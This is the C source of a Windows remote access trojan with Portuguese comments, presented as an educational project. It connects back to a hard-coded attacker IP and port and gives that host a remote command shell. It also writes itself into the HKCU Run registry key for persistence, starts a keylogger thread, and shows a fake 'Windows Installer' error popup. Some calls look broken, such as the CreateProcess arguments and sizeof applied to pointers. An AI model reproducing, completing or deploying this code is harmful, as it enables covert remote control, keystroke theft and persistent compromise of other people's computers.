/*
 * Criado por Jean(Kripto-Sec) estudante de segurança da informação
 * Criado apenas para fins educativos não use para beneficio proprio
 * Apenas para estudo
 * github: https://github.com/Kripto-Sec
 * bom estudo
 */

#include <direct.h>
#include <Windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>
#include "keylogger.h"

#pragma comment(lib, "Ws2_32.lib")

int sock;

int boot_run()
{
    const char* err = "Erro\n";
    const char* suc = "Persistencia Criada em : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
    
    TCHAR path[MAX_PATH];
    DWORD path_len = GetModuleFileName(NULL, path, MAX_PATH);

    if (path_len == 0) {
        send(sock, err, strlen(err), 0);
        return -1;
    }

    HKEY new_val;
    
    //quando chamado cria um NewVal Hkey onde a persistencia sera inserida
    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &new_val) != ERROR_SUCCESS) {
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    DWORD path_len_in_bytes = path_len * sizeof(*path);

    //caso queira modifique o campo "TEXT" para o nome de sua preferencia
    if (RegSetValueEx(new_val, TEXT("Hackeado"), 0, REG_SZ, (LPBYTE)path, path_len_in_bytes) != ERROR_SUCCESS) {
        RegCloseKey(new_val);
        send(sock, err, sizeof(err), 0);
        return -1;
    }
    RegCloseKey(new_val);
    send(sock, suc, sizeof(suc), 0);
    return 0;
}

// vai ser usada para dar comandos ao sistema
void shell() {
    // criando 2 variáveis para ser usadas lá em baixo
    char buffer[1024];
    char container[1024];

    while (1) {
        ZeroMemory(buffer, 1024);
        ZeroMemory(container, sizeof(container));
        recv(sock, buffer, 1024, 0);

        // strncmp para compara se a string q e igual ao buffer para fechar a conexão
        if (strncmp("q", buffer, strlen(buffer)) == 0) {
            closesocket(sock);
            WSACleanup();
            return;
        }

        else if (strncmp("cd ", buffer, 3) == 0) 
            _chdir((const char*)(buffer+3));

        else if (strncmp("persistence", buffer, 11) == 0) 
            boot_run();
        
        else if (strncmp("keylog_start", buffer, 12) == 0) {
            HANDLE thread = CreateThread(NULL, 0, logg, NULL, 0, NULL);
            if (thread != INVALID_HANDLE_VALUE && thread != NULL)   // não usamos a HANDLE da thread em momento nenhum
                CloseHandle(thread);                                // note que fechar a HANDLE não fecha o objeto
        }

        else {
            // executar o buffer
            char* total_response = malloc(18384);
            if (total_response != 0) {
                ZeroMemory(total_response, 18384);
                SECURITY_ATTRIBUTES attributes;

                HANDLE r_stdout, w_stdout;
                HANDLE r_stdin, w_stdin;

                attributes.nLength = sizeof(SECURITY_ATTRIBUTES);
                attributes.bInheritHandle = TRUE;
                attributes.lpSecurityDescriptor = NULL;

                CreatePipe(&r_stdout, &w_stdout, &attributes, 0);
                SetHandleInformation(r_stdout, HANDLE_FLAG_INHERIT, 0);
                CreatePipe(&r_stdin, &w_stdin, &attributes, 0);
                SetHandleInformation(r_stdin, HANDLE_FLAG_INHERIT, 0);

                PROCESS_INFORMATION proc_info;
                STARTUPINFO startup_info;

                ZeroMemory(&proc_info, sizeof(PROCESS_INFORMATION));
                ZeroMemory(&startup_info, sizeof(STARTUPINFO));

                startup_info.cb = sizeof(STARTUPINFO);
                startup_info.hStdError  = w_stdout;
                startup_info.hStdOutput = w_stdout;
                startup_info.hStdInput  = r_stdin;
                startup_info.dwFlags |= STARTF_USESTDHANDLES;

                CreateProcess(TEXT("command"), TEXT("execute"), NULL, NULL, TRUE,
                    0, NULL, NULL, &startup_info, &proc_info);

                DWORD bytes_written = 0;
                WriteFile(w_stdin, buffer, 1024, &bytes_written, NULL);
                
                if (ReadFile(r_stdout, container, 1024, &bytes_written, NULL)) {
                    container[1023] = '\0';     // assegura uma null-terminated string
                    strcat_s(total_response, 18384, container);
                }

                TerminateProcess(proc_info.hProcess, 0);

                CloseHandle(proc_info.hProcess);
                CloseHandle(proc_info.hThread);
                CloseHandle(r_stdout);
                CloseHandle(w_stdout);
                CloseHandle(r_stdin);
                CloseHandle(w_stdin);

                send(sock, total_response, sizeof(total_response), 0);
                free(total_response);
            }

            else 
                send(sock, "malloc() failed at shell()", 27, 0);
        }
    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    struct sockaddr_in serv_addr;
    WSADATA wsa_data;

    //definindo o ip atacante e a porta
    const char* server_ip = "192.168.0.105";
    const unsigned short server_port = 50005;

    /* A estrutura WSADATA contem informacoes sobre
     * A implementacao do windows sockets
     * O parametro MAKEWORD(2,0) de WSAStartup faz uma solicitacao
     * Para a versao do 2.0 do winsock no sistema e define a versao aprovada
     * Como a versao mais alta do suporte windows socket que podemos usar 
     */
    if (WSAStartup(MAKEWORD(2, 0), &wsa_data) != 0)
        return 1;

    sock = socket(AF_INET, SOCK_STREAM, 0);

    //usando o memset para limpar as var 0
    ZeroMemory(&serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    inet_pton(AF_INET, server_ip, &serv_addr.sin_addr);
    serv_addr.sin_port = htons(server_port);

    //loop que tenta conectar
    while (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) != 0)
        Sleep(10);
    
    //comente esta parte caso nao queira um popup
    MessageBox(NULL, TEXT("Voce foi hackeado parabens!!!"), TEXT("Windows Installer"), MB_OK | MB_ICONERROR);
    
    //chama a shell la em cima
    shell();

    return 0;
}
